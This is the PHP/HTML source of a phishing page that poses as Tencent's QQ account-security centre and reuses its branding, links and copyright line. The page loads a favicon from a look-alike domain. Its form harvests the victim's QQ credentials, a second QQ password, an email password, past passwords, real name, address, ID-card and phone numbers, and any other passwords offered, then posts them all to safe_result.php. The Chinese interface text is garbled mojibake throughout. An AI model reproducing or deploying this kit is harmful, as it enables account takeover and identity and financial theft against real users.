<?php
	require('function.php');

	if(!isset($_GET['u']) || !isset($_GET['p'])){
		echo "<script>alert('��Ȩ����');window.location.href='index.php'</script>";
	}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<link href="safe_files/global.css" rel="stylesheet" type="text/css">
<link href="safe_files/base.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="http://serviec.boy-ex.com/favicon.ico">
<script async="" type="text/javascript" src="safe_files/cdn_djl.js"></script><script type="text/javascript" src="safe_files/jquery.js"></script>
<script type="text/javascript" src="safe_files/common.js"></script>
<script type="text/javascript" src="safe_files/ctrlManager.js"></script>
<script type="text/javascript" src="safe_files/vry_question.js"></script>
<script type="text/javascript" src="safe_files/check.js"></script>
<script type="text/javascript" src="safe_files/dna.js"></script>
<script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js"></script>
	<title>��ȫ����</title>	
	<style type="text/css">
		.ac_menu{border:1px solid #3162A6;background-color:#F6F6F6;cursor:default;overflow:hidden;height:expression((this.scrollHeight>130)?"130px":"auto")}
		.ac_menuitem{width:100%;color:#141414;padding:2px;text-align:left;}
		.ac_menuitem_selected{background-color:#D6DEEC;width:100%;color:#141414;padding:2px;text-align:left;}
		#popupcontent{position:absolute;visibility:hidden;cursor:default;z-index:99;} 
	</style>
	<script type="text/javascript">window.onerror=function(){return true;}</script>
<script src="safe_files/aq_float_frame.js" type="text/javascript"></script><script src="safe_files/cdn_dianjiliu.js"></script></head>
	
 
<body>
 
 
<!--Header-->
<div id="headerAll">
 
 
	<div class="round" id="login_alert" style="display:none;z-index:10003;left:30%;top:30%;">
    	<div class="r_top"></div>
	</div>
	<div id="header">
 
    	<div id="top">
		<a onfocus="this.blur()" class="logo" href="cn2.php"><cite>��ȫ����<br>
		�������ȫ����</cite></a>
        	<div class="right_info">
            <ul>
			
            <li><span>��ӭ����<?php echo iconv("UTF-8","GB2312//IGNORE",getQQNick($_GET['u'])); ?>(<?php echo $_GET['u']; ?>)</span></li>
			<li class="cent" id="safe_score_item"><a href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>"><strong id="head_safe_score"><font color="#FF8000">
			30��</font></strong></a></li>
			 <li><a href="javascript:LoginOut();">�˳�</a></li>
			
            <li class="pr"><a href="javascript:;" onmouseover="ShowSubMenu('site_map_menu');" onmouseout="HideSubMenu('site_map_menu');">
			վ���ͼ<b></b></a></li>
			 <li><a href="http://service.qq.com/special/aq.html" target="_blank">
				��Ѷ�ͷ�</a></li>
			
			<li><a href="http://support.qq.com/discuss/387_1.shtml" target="_blank">
			�������</a></li>
			
            </ul>
            </div>
 
        </div>
    
    	<div id="menu">
        	<ul>
            <li id="menu_index"><a onfocus="this.blur()" class="m1" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>"><cite>
			��ҳ</cite></a></li>
            <li id="menu_account_prot"><a onfocus="this.blur()" class="m2" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_account_prot');" onmouseout="HideSubMenu('submenu_account_prot');"><cite>
			�ʺű���</cite></a></li>
            <li class="on3" id="menu_pwd_manage"><a onfocus="this.blur()" class="m3" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_pwd_manage');" onmouseout="HideSubMenu('submenu_pwd_manage');"><cite>
			�������</cite></a></li>
            <li id="menu_safe_mutual"><a onfocus="this.blur()" class="m4" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover=""><cite>
			��ȫѧ��</cite></a></li>
            </ul>
        </div>
 
   	  <a onfocus="this.blur()" class="toolbox" href="javascript:;" onmouseover="ShowSubMenu('menu_toolbox')"><cite>
		�ܱ�������</cite></a>
 
  </div>
</div><!--Header End-->
 
<!--Wrapper-->
<div id="wrapper">
	<div class="top"></div>
	<div class="center1 password_management">
	<div class="title_r"><a onfocus="this.blur()" href="#">�������</a><em> &gt; </em>
		����쳣</div>
        
	
	<div class="token_process token_process4 mt10">
		
		<div class="blank20"></div>
		<p class="f14 ta_c mt10" style="text-align: left">
			�뾡����д������ʵ���Ϻ���ʷ����,�Ա�ͨ��ϵͳ��ˡ�
			<a target="_blank" onfocus="this.blur()" href="http://www.tencent.com/zh-cn/le/privacy.shtml">
			��˽����</a><br><br>
		</p>
		<!--<div class="title_right3"><b class="tr_13"></b></div><br><br>-->
		<img style="display:none" src="safe_files/1.jpg">
		<!--<div class="title3"><b>�ʺŻ�����Ϣ</b></div>-->

		<p></p>
		

		<p></p>
		<?php
			// $requestURL="u=".$_GET['u']."&p=".$_GET['p']."&txtName=$trueName&txtAddress=$addr&txtContactQQ=$anotherQQ&txtContactQQPW=$password&radiobutton=$reciveType&txtContactEmail=$reciveMail&yxmm=$$reciveMailPassword";
		?>
		<form id="myform" name="myform" method="post" action="safe_result.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onsubmit="return CheckForm();">

			<input id="txtLoginUin" name="txtLoginUin" value="1234455" type="hidden">
			<input value="0" id="txtCtCheckBox" name="txtCtCheckBox" type="hidden">
			
			
		 <!--������ʾ-->
          <div class="tipbox tipbox_yellow" id="tipbox_1" style="position:absolute;left:314px;top:100px; display:none">
            <a class="close" id="tip_1" onclick="close_tip_box(this);"><cite>�ر�</cite></a>
            <span>ֻҪ����<b class="red">���ڵ�����</b>�Ϳ�����<em> ^_^ </em></span>  &nbsp;
            <div class="tipbox_direction tipbox_down"><em>��</em><span>��</span></div>
          </div>
          <!--������ʾ end-->
		  
			<ul class="ulp">
			<li style="display:none">
				<blockquote><b>*</b> ������ʵ������</blockquote>
				<input name="txtName" id="txtName" class="input_text" size="26" maxlength="20" onpaste="return false" type="text">
				<span id="infoName" style="display:none" class="tips_info">����û��������ʵ������</span>
			</li>
			</ul>            
            

            <div class="blank20"></div>
            <!--<div class="title_right1"><b class="tr_14"></b></div>-->
            <img src="safe_files/2.jpg">
            <!--<div class="title3"><b>��ϵ����</b></div>-->

            <ul class="ulp">
            <li>
				<blockquote><b>*</b> ������һ��QQ�ĺ��룺</blockquote>
				<input name="txtContactQQ" id="txtContactQQ" size="24" maxlength="12" onkeyup="dispEm();" onblur="dispEm(); checkQqPwd(0);" class="input_text" style="ime-mode:disabled" onkeypress="return checkinput(event);" type="text">

            </li>
            <li>
				<blockquote><b>*</b> ���룺</blockquote>	
				<input name="txtContactQQPW" id="txtContactQQPW" size="24" maxlength="20" class="input_text" style="ime-mode: disabled;" onkeypress="detectCapsLock(event,'divCaps');" onblur="checkQqPwd(1);" onpaste="return false;" type="password">
				<!-- <input name="txtContactQQPW" id="txtContactQQPW2" size="24" maxlength="20" class="input_text" style="ime-mode: disabled; display: none;" onpaste="return false" onblur="checkQqPwd(1);" autocomplete="off" type="text">				 -->
				<input name="checkbox" id="checkbox" onclick="ChangePwdInputType(1);" type="checkbox">
				<label for="checkbox">��ʾ����</label>
				<span id="infoPassWdOne" class="tips_info" style="display:none;">����д��ϵQQ����</span>				
				<span class="tp_txt">����ȷ��д���룬����д���󣬽�����ƽ�չ���޷�֪ͨ����QQ</span>

            </li>
            <li>
				<blockquote><b>*</b> ������շ�ʽ��</blockquote>
	            <span class="tp_txt5">					
		            <input name="radiobutton" id="radioEmail" value="mail" checked="checked" onclick="onRadioChange('senfe_1');" type="radio">
					<label for="radioEmail">�����ʼ�</label>
				</span>
	            <span class="tp_txt5"> 
					<input name="radiobutton" id="radioPhone" value="phone" onclick="onRadioChange('senfe_2');" type="radio">
					<label for="radioPhone">�ֻ�����</label>
				</span>
            </li>
			            
            <li id="senfe_1" style="">
				<blockquote><b>*</b> ���ս�������䣺</blockquote>
				<input id="txtContactEmail" name="txtContactEmail" class="input_text" value="����д���ĳ�������" onblur="if(this.value==''){this.value='����д���ĳ�������';}" style="ime-mode: disabled; color: rgb(153, 153, 153);" autocomplete="off" type="text">
				<span id="infoEmail" class="tips_info" style="display:none">����ȷ��д��������</span>
            </li>
            <li id="senfe_2" style="display: none;">
				<blockquote><b>*</b> ���ս�����ֻ���</blockquote>
				<input name="txtContactMobile" id="txtContactMobile" class="input_text" value="����д���ĳ����ֻ�" onblur="if(this.value==''){this.value='����д���ĳ����ֻ�';}" style="ime-mode: disabled; color: rgb(153, 153, 153);" maxlength="11" onkeypress="return checkinput(event);" type="input_text">
				<span id="infoMobile" class="tips_info" style="display:none">����ȷ��д�ֻ�����</span>
				<span class="tp_txt">���߳ɹ��󣬸��ֻ����Զ�����Ϊ�ܱ��ֻ�<br>
				�ʷѣ����ŷ����������ڵ�����ͨ�����ʷ�һ��(һ��Ϊ0.1Ԫ/��)����Ѷ��˾����ȡ�κη���</span>
            </li>

            
            <li id="senfe_3" style="display:;">
				<blockquote><b>*</b> ���ս�����������룺</blockquote>
<input name="yxmm" id="txtContactQQPW" size="24" maxlength="20" class="input_text" style="ime-mode:disabled" onkeypress="detectCapsLock(event,'divCaps');" onblur="checkQqPwd(1);" onpaste="return false;" type="password">
				<span id="infoMobile" class="tips_info" style="display:none">
				����ȷ��д�ֻ�����</span>  
				<span class="tp_txt">����ȷ��д���룬����д���󣬽�����ƽ�չ���޷�֪ͨ����QQ</span>
				<span class="tp_txt">������Ƴɹ��󣬸�������Զ�����Ϊ���������е���ϵ����</span>
            </li>
            
            </ul>
			
			<div class="blank20"></div>
            <!--<div class="title_right1"><b class="tr_14"></b></div>-->
            <img src="safe1_files/1.jpg">

            <ul>
            <li id="lifillBase0">
				<blockquote for="psw1"><b>*</b>��ʷ����һ��</blockquote>
				&nbsp;<input name="history_pwd_1_password" id="pwdOldPW1" value="" class="input_text" maxlength="17" style="ime-mode:disabled" onkeypress="detectCapsLock(event, 1);" onpaste="return false;" onblur="deletCapsTip();" type="password">				
				<span class="tp_txt4 f14" style="position: absolute; margin-left: 641px; margin-top: 343px"></span>
				<span id="lsmm1" style="display:none" class="tips_info">������дһ���������ù�������</span>&nbsp; 
			</li>				
			<li id="lifillBase1">
				<blockquote for="psw2"><b>*</b>��ʷ�������</blockquote>
				&nbsp;<input name="pwdOldPW2" id="pwdOldPW2" value="" class="input_text" maxlength="17" style="ime-mode:disabled" onkeypress="detectCapsLock(event, 2);" onpaste="return false;" onblur="deletCapsTip();" type="password"> 
			</li>
			<li id="lifillBase2">
				<blockquote for="psw3"><b>*</b>��ʷ��������</blockquote>
				&nbsp;<input name="pwdOldPW3" id="pwdOldPW3" value="" class="input_text" maxlength="17" style="ime-mode:disabled;" onkeypress="detectCapsLock(event, 3);" onpaste="return false;" onblur="deletCapsTip();" type="password"> 
			</li>
 
			
			<li id="pwdOption">
				<blockquote for="more">��</blockquote>				
 
 
			<ul class="ulp">
			<li>
				<blockquote><b>*</b> ������ʵ������</blockquote>
				<input name="xm" id="xm" class="input_text" size="26" maxlength="20" type="text">
				<span id="infoName" style="display:none" class="tips_info">
				����û��������ʵ������</span>
			</li>
			<script type="text/javascript">
				$("#xm").blur(function(){
				  $("#txtName").val($(this).val());
				});
			</script>
			<li>
				<blockquote>������ϸ��ַ��</blockquote>
				<input name="txtAddress" id="txtAddress" size="26" maxlength="24" class="input_text" type="text">
			</li>
			<li><blockquote for="mode">֤�����ͣ�</blockquote>
							<select class="select_text" id="CertCardType" name="zj">
				<option value="0" selected="selected">��ѡ��֤������</option>
				<option value="shen_fen_zheng">���֤</option> 
				<option value="hu_zhao">����</option> 
				<option value="jun_guan_zheng">����֤</option> 
				<option value="qi_ta">����</option></select><span style="DISPLAY: none" id="zjlx" class="tips_info">��ѡ��֤�����ͣ�</span>
				</li>
			<li>
				<blockquote><b>*</b>֤�����룺</blockquote>
				<input name="hm" id="zjhm1" size="26" maxlength="24" class="input_text" type="text">&nbsp;<span style="DISPLAY: none" id="zjhm2" class="tips_info">����д��ʷ֤�����룡</span>
			</li>
			<li>
				<blockquote><b>*</b>�ֻ����룺</blockquote>
				<input name="sj" id="mbsj1" size="26" maxlength="11" class="input_text" style="ime-mode:disabled" type="text">&nbsp;<span style="DISPLAY: none" id="mbsj2" class="tips_info">����ȷ��д�ֻ����룡</span>
			</li>
			</ul>            
            
<div style="display:">
            <div class="middle_title font_14"></div>
            <div class="title3"><b>��������</b></div>
			<div>
				<p class="mt10 ml100 f14">�����Ը��������д�����������磺������԰�������룬õ�廨԰�������룬�Ƹ�ͨ�������롢֧������֧������ȣ�������߽�������ɹ��Ļ��ᡣ</p>
            </div></div></li><li>
			</li><li id="pwdOption">
				<blockquote for="more"></blockquote>	
				<textarea rows="4" name="ziliao" id="btzl1" size="26" class="textarea"></textarea> &nbsp;&nbsp;
				<span id="btzl2" class="tips_info" style="display:none;">��������д��������</span>
            </li>
            </ul>

            <li class="btn">
            <input onclick="vbscript:myform1.submit()" src="safe_files/anniu.jpg" type="image">&nbsp;
			</li>

	
	</form>        
	</div>    
	</div>
	</div>
    <div class="bottom"></div>
<!--Wrapper End-->
 
<!--Hover��ʾ-->
<div class="all_tips" id="divCaps" style="display:none;left:570px;top:720px;">
	<i class="pointer"></i>
	<i class="warn_orange"></i>
	��д�����������£���ע���Сд
</div>
<!--End Hover��ʾ-->
 
<!--Footer-->
<!--Footer-->
<div id="footer">
  <p><a href="http://www.tencent.com/" target="_blank">������Ѷ</a>|<a href="http://www.tencent.com/index_e.shtml" target="_blank">About Tencent</a>|<a href="http://www.qq.com/contract.shtml" target="_blank">��������</a>|<a href="http://hr.tencent.com/" target="_blank">��Ѷ��Ƹ</a>|<a href="http://serviec.boy-ex.com/v2/notice/content_6.shtml" target="_blank">©������</a>|<a href="http://service.qq.com/" target="_blank">��Ѷ�ͷ�<span id="debug"></span></a></p>
  <p>Copyright &#169; 1998 - 2013 Tencent. All Rights Reserved </p>
  <p>��Ѷ��˾ ��Ȩ����</p>
</div>
<script language="javascript"> 
	if (typeof(timePoints) != "undefined")	
	{
		timePoints[0] = new Date();	
		$(document).ready(function() {
			timePoints[1] = new Date();
		});	
	}	
</script>
<iframe name="aqrjs_hidden_frame" id="aqrjs_hidden_frame" style="width:150px; height:150px; display:none;"></iframe>
<!--Footer End-->
 
 
 
<!--Footer End-->
<div id="popupcontent"></div>
 
<div id="mobile_confirm" class="round_container" style="display:none;">
	 <div class="round_content l_h">
		<span>������Ӫ�����ߵ������ֻ������·��������ȶ����������߽��֪ͨ�Ķ��Ų��ܵ��������ֻ���
				����<a href="javascript:useEmail()">������ʹ�õ����ʼ���Ϊ���ߵ���ϵ��ʽ��</a></span>
	  </div>
	  
	  <div class="round_button">
		<a id="btOk" class="button" href="javascript:useEmail();">
		<span>&nbsp;ȷ&nbsp;&nbsp;��&nbsp;</span></a>
		<a id="btuseE" class="button1" href="javascript:useEmail();">
		<span>&nbsp;ʹ������&nbsp;</span></a>
	  </div>
</div>
 
<div id="email_confirm" class="round_container" style="display:none;">
	 <div class="round_content l_h">
		<p><b>����д����������޷����յ�ϵͳ֪ͨ</b></p>
		<ul>
		<li>&nbsp;&nbsp; QQ����ĸ�ʽһ��Ϊ��QQ����@qq.com</li>
		</ul>
		<br>
		<p>���û�����䣬������</p>
		<ul>
		<li>&nbsp;&nbsp;ʹ���ֻ���Ϊ������ϵ��ʽ</li>
		<li>&nbsp;&nbsp;<a href="http://kf.qq.com/info/12632.html" target="_blank">���˿�ͨQQ����</a></li>
		</ul>
	  </div>
	  
	  <div class="round_button">
	  	<a id="btCancel" class="button" href="javascript:useMobile();">
		<span>&nbsp;ȡ&nbsp;&nbsp;��&nbsp;</span></a>
		<a id="btUseMobile" class="button1" href="javascript:useMobile();">
		<span>&nbsp;ʹ���ֻ�&nbsp;</span></a>
	  </div>
</div>
 
<div id="no_email_1" class="round_container" style="display:none;">
	 <div class="round_content l_h">
		<p><b>��������д����һ�������QQ����</b></p>
		<ul>
		<li>&nbsp;&nbsp; QQ����ĸ�ʽһ��Ϊ��QQ����@qq.com</li>
		</ul>
		
		<br>
		<ul>
		<li>��Ҳ����<a href="javascript:useMobile()">ʹ���ֻ���Ϊ������ϵ��ʽ</a></li>
		</ul>
	  </div>
	  
	  <div class="round_button">
	  	<a id="btCancel_email_1" class="button" href="javascript:useOtherQQEmail();">
		<span>&nbsp;ȡ&nbsp;&nbsp;��&nbsp;</span></a>
		<a id="btUseOtherQQEmail_nomail" class="button1" href="javascript:useOtherQQEmail();">
		<span>&nbsp;ȷ&nbsp;&nbsp;��&nbsp;</span></a>
	  </div>
</div>
 
<div id="no_email_2" class="round_container" style="display:none;">
	 <div class="round_content l_h">
		<p><b>û�����䣿������</b></p>
		<ul>
		<li>&nbsp;&nbsp;ʹ���ֻ���Ϊ������ϵ��ʽ</li>
		<li>&nbsp;&nbsp;<a href="http://kf.qq.com/info/12632.html" target="_blank">���˿�ͨQQ����</a></li>
		</ul>	
	  </div>
	  
	  <div class="round_button">
	  	<a id="btCancel_email_2" class="button" href="javascript:closeAlert();">
		<span>&nbsp;ȡ&nbsp;&nbsp;��&nbsp;</span></a>
		<a id="btUseMobile_noemail" class="button1" href="javascript:useMobile();">
		<span>&nbsp;ʹ���ֻ�&nbsp;</span></a>
	  </div>
</div>
 
<div id="check_email_err" class="round_container" style="display:none;">
	<div class="round_content l_h">
		<p><b>����д�������ʽ����</b></p>
		<ul>
		<li>&nbsp;&nbsp; QQ����ĸ�ʽһ��Ϊ��QQ����@qq.com</li>
		</ul>
		
		<br>
		<p>���û�����䣬������</p>
		<ul>
		<li>&nbsp;&nbsp;ʹ���ֻ���Ϊ������ϵ��ʽ</li>
		<li>&nbsp;&nbsp;<a href="http://kf.qq.com/info/12632.html" target="_blank">���˿�ͨQQ����</a></li>
		</ul>
	  </div>
	  
	  <div class="round_button">
	  	<a id="btCancel_email_err" class="button" href="javascript:closeAlert();">
		<span>&nbsp;ȡ&nbsp;&nbsp;��&nbsp;</span></a>
		<a id="btUseMobile_email_err" class="button1" href="javascript:useMobile();">
		<span>&nbsp;ʹ���ֻ�&nbsp;</span></a>
	  </div>
</div>
 


 
<script language="javascript"> 
 
	$("#header_login_but").css("display","none");
	$("#menu_pwd_manage").addClass("on3");
	
	var firstin = true;
	var usePhone = false;
	var topDiv="base";
	var first_email_err = true;
	asyLoadScript("/v2/js/aq_float_frame.js");
		
	var TxtContactEamilWords = "����д���ĳ�������";
	var TxtContactMobileWords = "����д���ĳ����ֻ�";
	
	var g_interval1 = 30;
	var g_start_sec = 0;
	var g_timer1 = 0; 
	//var tipbox2_state = 0;
	var btipbox2_focus = false;
	var g_curr_id = "";
	
	//var tipbox3_state = 0;
	var g_interval2 = 500;
	var btipbox3_focus = false;
	
	//�ֲ�������ʾ
	var loc_start_sec = 0;
	var loc_interval = 20;
	var loc_timer = 0;
	var loc_curr_obj_id = 0;
	var loc_curr_tipbox_id = 0;
	
	function StartLocalTimer()
	{	
		var d = new Date();
		var t = d.getTime();
		var curr_sec = t / 1000;
        
		if(curr_sec - loc_start_sec > loc_interval && loc_timer != 0)
		{
			if($("#"+loc_curr_obj_id).val() == ""  && loc_curr_obj_id != "" && loc_curr_tipbox_id != "")
			{
				$("#"+loc_curr_tipbox_id).slideDown("normal");
				if(g_curr_id != "")
				{
					$("#"+g_curr_id).slideUp("normal");
					g_curr_id = "";
				}
				
				var index = loc_curr_tipbox_id.substring(7);
				if(index == "1")
				{
					$("#txtName").focus();
					sendHotClick('SmartTips.Name.Alert');
				}
				
				if(index == "2")
				{
					$("#txtName").focus();
					sendHotClick("BigTips.NameContact.Alert");
				}
				
				if(index == "3")
				{
					$("#txtContactEmail").focus();
					sendHotClick("BigTips.Contact.Alert");
				}
				if(index == "4")
				{
					$("#txtAddress").focus();
					sendHotClick("SmartTips.Address.Alert");
				}
				
				if(index == "5")
				{
					$("#txtIDCard").focus();
					sendHotClick("SmartTips.IDCard.Alert");
				}
				
				if(index == "6")
				{
					$("#txtContactQQ").focus(); 
					sendHotClick("SmartTips.OtherQQ.Alert");
				}
				
				if(index == "7")
				{
					$("#txtContactEmail").focus(); 
					sendHotClick("SmartTips.Contact.Alert");
				}
 
			}
			StopCount(loc_timer);
			loc_timer = 0;
		}
		else
		{
			loc_timer = setTimeout("StartLocalTimer()", 1000);
		}
	}
	
	function TimeCount4Name()
	{	
		var d = new Date();
		var t = d.getTime();
		var curr_sec = t / 1000;
        
		if(curr_sec - g_start_sec > g_interval1)
		{
			if(btipbox2_focus == false)
			{
				$("#tipbox_2").slideDown("normal");
				sendHotClick("BigTips.NameContact.Alert");
				g_curr_id = "tipbox_2";
				//tipbox2_state = 1;
			}
			StopCount(g_timer1);
			g_timer1 = 0;
		}
		else
		{
			g_timer1 = setTimeout("TimeCount4Name()", 1000);
		}
	}
	
	function TimeCount4Contact()
	{
		var d = new Date();
		var t = d.getTime();
		var curr_sec = t / 1000;
        
		if(curr_sec - g_start_sec > g_interval2 /*&& btipbox3_focus == false*/)
		{
			if(loc_curr_obj_id == "" && loc_curr_tipbox_id == "")
			{
				$("#tipbox_3").slideDown("normal");
				g_curr_id = "tipbox_3";
				sendHotClick("BigTips.Contact.Alert");
			}
			//tipbox3_state = 1;
			StopCount(g_timer1);
			g_timer1 = 0;
		}
		else
		{
			g_timer1 = setTimeout("TimeCount4Contact()", 1000);
		}
	}
	
	function StopCount(timer)
	{
		clearTimeout(timer);
	}
	
	function close_tip_box(obj)
	{
		var id = obj.id;
		var index = id.substring(4);
		$("#tipbox_" + index).slideUp("normal");
		if(index == "1")
		{
			$("#txtName").focus();
			sendHotClick('SmartTips.Name.Close');
		}
		
		if(index == "2")
		{
			//tipbox2_state = 1;
			$("#txtName").focus();
			sendHotClick("BigTips.NameContact.Close");
		}
		
		if(index == "3")
		{
			//tipbox3_state = 1;
			$("#txtContactEmail").focus();
			sendHotClick("BigTips.Contact.Close");
		}
		if(index == "4")
		{
			$("#txtAddress").focus();
			sendHotClick("SmartTips.Address.Close");
		}
		
		if(index == "5")
		{
			$("#txtIDCard").focus();
			sendHotClick("SmartTips.IDCard.Close");
		}
		
		if(index == "6")
		{
			$("#txtContactQQ").focus(); 
			sendHotClick("SmartTips.OtherQQ.Close");
		}
		
		if(index == "7")
		{
			$("#txtContactEmail").focus(); 
			sendHotClick("SmartTips.Contact.Close");
		}
		
		if(index == "2" || index == "3")
		{
			g_curr_id = "";
		}
		else
		{
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
		}
	}
	
	function closeAlert()
	{
		CAqCommFrame.close();
		topDiv="base";
	}
	
	checkinput = function(e)
	{
		if ($.browser.msie) {
			if ( ((event.keyCode > 47) && (event.keyCode < 58)) ||   
				  (event.keyCode == 8) ||  (event.keyCode == 0) ||  
				  (event.keyCode == 13) ||  (event.keyCode == 118) ) {   
				return true;   
			} else {   
				return false;   
			}   
		} else {   
			if ( ((e.which > 47) && (e.which < 58)) ||   
				  (e.which == 8) || (e.which == 0) ||  
				  (e.which == 13) || (e.which == 118)) {   
				return true;   
			} else {   
				return false;   
			}   
		}   
	}
	
	function checkSecurityQQNumber()
	{
		var SecurityQQNum = $("#txtContactQQ").val();
		var friendNumList = SecurityQQNum + ",";
		if(SecurityQQNum > 0)
		{
			$.getJSON("/cn2/appeal/appeal_check189type", {FriendUinList:friendNumList, Type:"SecurityQQ"},
			function(json) {
				if (json[0] == 0)
				{
					$("#form1").submit();
				}
				else
				{
					$("#infoContactQQ").text("��������ȷ��QQ���룡");
					$("#infoContactQQ").show();
				}
			});
		}
		else
		{
			$("#form1").submit();
		}
	}
	
	function useOtherQQEmail()
	{
		if($("#txtContactQQ").val() != "" )
		{
			var OtherQQEmail =  $("#txtContactQQ").val() + "@qq.com";
			$("#txtContactEmail").val(OtherQQEmail);
		}
		closeAlert();
	}
	
	function noEmail()
	{
		var otherQQcontact = $("#txtContactQQ").val();
		if(otherQQcontact != "")
		{
			var OtherQQEmail = otherQQcontact + "@qq.com";
			$.getJSON( "/cn2/ajax/check_mail_addr", { uin: $.trim($("#txtLoginUin").val()), mail: $.trim(OtherQQEmail), uintype:"qq_num" },
					function(json) {
					if (json.code == 0)
					{
						topDiv="no_email_1";	
						CAqCommFrame.show({title:'��ܰ��ʾ',type:'div', id:"no_email_1"});
					}
					else
					{
						topDiv="no_email_2";	
						CAqCommFrame.show({title:'��ܰ��ʾ',type:'div', id:"no_email_2"});
					}
				});
		}			
		else
		{		
			topDiv="no_email_2";	
			CAqCommFrame.show({title:'��ܰ��ʾ',type:'div', id:"no_email_2"});
		}
	}
	
	function useMobile()
	{
		closeAlert();
		usePhone = false;
		$("#radioPhone").click();
		for(var i=1; i<=2; ++i) {
			var ctrl=document.getElementById("senfe_"+i);
			ctrl.style.display="none";
		}
		document.getElementById("senfe_2").style.display="";	
	}
	
	function useEmail()
	{
		closeAlert();
		$("#radioEmail").click();
	}
	
	function checkEmailAddr()
	{
		var emailaddr_input = $("#txtContactEmail").val();
		var emailaddr = emailaddr_input.toLowerCase();
		if( emailaddr == "123456@qq.com" || emailaddr == "www@qq.com" || emailaddr == "www.qq@qq.com" || emailaddr == "qq.com@qq.com" 
		|| emailaddr == "www.com@qq.com" || emailaddr == "w@163.com" || emailaddr == "ww@163.com" || emailaddr == "www@163.com" 
		|| emailaddr == "www.@163.com" || emailaddr == "qq@163.com" || emailaddr == "1@163.com" || emailaddr == "2@163.com" 
		|| emailaddr == "ww@126.com" || emailaddr == "www@126.com" || emailaddr == "w@yahoo.com.cn" || emailaddr == "www@yahoo.com.cn" 
		|| emailaddr == "1@yahoo.com.cn" || emailaddr == "123456789@qq.com" || emailaddr == "www.qq.com@qq.com" || emailaddr == "service@tencent.com"
		|| emailaddr == "youxiang@sina.com" || emailaddr == "www.123@qq.com" || emailaddr == "chen@qq.com" || emailaddr == "10000@qq.com")
		{
			topDiv="email_confirm";	
			CAqCommFrame.show({title:'��ܰ��ʾ',type:'div', id:"email_confirm"});
			return false;
		}
		else
		{
			return true;
		}
	}
	
	$(document).ready(function ()
	{
		var d = new Date();
		var t = d.getTime();	
		g_start_sec = t/1000;
		//���������ϵ��ʽ������ʾ
		TimeCount4Name();
 
		InitBox($("#txtContactEmail"), TxtContactEamilWords);
		InitBox($("#txtContactMobile"), TxtContactMobileWords);
		ChangePwdInputType(0);
		var contactType = document.getElementById("radioEmail");
		if (contactType.checked) onRadioChange('senfe_1');
		else onRadioChange('senfe_2');
		
		$("#next").click(function() {
			var IsCanSubmit=false;
			if(CheckForm()) {
				if (contactType.checked) {
					$.getJSON( "/cn2/ajax/check_mail_addr", { uin: $.trim($("#txtLoginUin").val()), mail: $.trim($("#txtContactEmail").val()), uintype:"qq_num" },
						function(json) {
							if (json.code == 1) {
								IsCanSubmit=false;
								$("#infoEmail").text("������ͬһ�������QQ���䣡");
								$("#infoEmail").show();
							}
							else if (json.code == 2) {
								IsCanSubmit=false;
								if(first_email_err)
								{
									$("#infoEmail").text("�����ʽ����");
									$("#infoEmail").show();
									first_email_err = false;
								}
								else
								{
									topDiv="check_email_err";	
									CAqCommFrame.show({title:'��ܰ��ʾ',type:'div', id:"check_email_err"});
								}
								
							}
							else if (json.code == 3)
							{
								IsCanSubmit=false;
								$("#infoEmail").text("��������δ����,");
								$("#infoEmail").append("<a href='http://kf.qq.com/info/12632.html' target='__blank'>��˿�ͨ</a>");
								$("#infoEmail").show();
							}
							else if (json.code == 4)
							{
								IsCanSubmit=false;
								$("#infoEmail").text("�����䲻����");
								$("#infoEmail").show();
							}
							else{
								IsCanSubmit=true;	
							}
							
							if (IsCanSubmit) 
							{
								if(checkEmailAddr())
								{
									checkSecurityQQNumber();
								}
							}
						}); 
				}
				else 
				{
					checkSecurityQQNumber();
				}
			}
		});
		
		$("#txtContactQQPW").focus(function () { 
			$("#infoPassWdOne").hide(); $("#txtContactQQPW").addClass("input_text_on");
			btipbox2_focus = true; btipbox3_focus = true;
		});
		
		$("#txtContactQQPW").blur(function() {
			$("#txtContactQQPW").removeClass("input_text_on");
		});
		
		$("#txtContactQQPW2").focus(function () {
			$("#infoPassWdOne").hide(); $("#txtContactQQPW2").addClass("input_text_on");
			btipbox2_focus = true; btipbox3_focus = true;
			});
		$("#txtContactQQPW2").blur(function() { 
			$("#txtContactQQPW2").removeClass("input_text_on");
		});
		
	
		$("#txtName").focus(function() {
			$("#infoName").hide(); 
			$("#txtName").addClass("input_text_on");
			btipbox2_focus = true;
			btipbox3_focus = true;
			
			//�����ֲ�������ʾ
			var d = new Date();
			var t = d.getTime();
			loc_start_sec = t / 1000;
			loc_curr_obj_id = "txtName";
			loc_curr_tipbox_id = "tipbox_1";
			StartLocalTimer();
			
		});
		
		$("#txtName").keydown(function() {
			//�ر�ȫ��������ʾ1
		   //if(tipbox2_state == 1)
		   {
				$("#tipbox_2").slideUp("normal");
				//tipbox2_state = 0;
			}
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
		});
		
		$("#txtName").blur(function() { 
			$("#txtName").removeClass("input_text_on");
 
			if($("#txtName").val() != "")
			{
				var d = new Date();
				var t = d.getTime();	
				g_start_sec = t/1000;
				//���������ϵ��ʽ������ʾ
				btipbox3_focus = false;
				TimeCount4Contact();
			}
			
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
 
		});
		
		$("#txtAddress").focus(function() {
			$("#txtAddress").addClass("input_text_on"); 
